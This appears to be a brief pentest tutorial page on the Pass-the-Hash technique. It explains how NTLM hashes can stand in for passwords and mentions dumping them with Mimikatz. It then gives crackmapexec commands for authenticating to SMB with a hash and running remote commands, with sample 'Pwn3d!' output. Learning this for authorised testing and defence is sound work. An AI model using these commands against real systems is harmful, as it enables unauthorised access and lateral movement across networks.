Understanding Pass-the-Hash

Pass-the-Hash (PtH) is a lateral movement technique where an attacker authenticates to a remote server or service by using the NTLM hash of a user's password, rather than the cleartext password itself.

  • **Mechanism:** Windows authentication protocols (like NTLM) can use hashes directly.
  • **Vulnerability:** Hashes can be dumped from memory (e.g., with Mimikatz) on a compromised host.
  • **Advantage:** Bypasses strong password policies as the cleartext password is never needed.
Common Misconception

Many believe you always need the plaintext password to authenticate. PtH proves that the hash itself can be sufficient, highlighting the importance of protecting credential material in memory.

PtH with `crackmapexec`

# Syntax for crackmapexec with PtH
crackmapexec smb <TARGET_IP> -u <USERNAME> -H <NTLM_HASH>

# Example:
crackmapexec smb 192.168.1.50 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# To execute a command remotely:
crackmapexec smb 192.168.1.50 -u Administrator -H <NTLM_HASH> -x "whoami /all"

# Expected Output (if successful):
# SMB       192.168.1.50    445    SERVER01         [+] Administrator:aad3b... (Pwn3d!)
# SMB       192.168.1.50    445    SERVER01         [*] Executing command: whoami /all
# ... (command output) ...
Practical Application

Use `crackmapexec` to test NTLM hashes against SMB services, enabling remote command execution and further network reconnaissance.

Key Takeaway

Pass-the-Hash is a powerful lateral movement technique that exploits how Windows handles NTLM hashes, allowing authentication without the cleartext password.
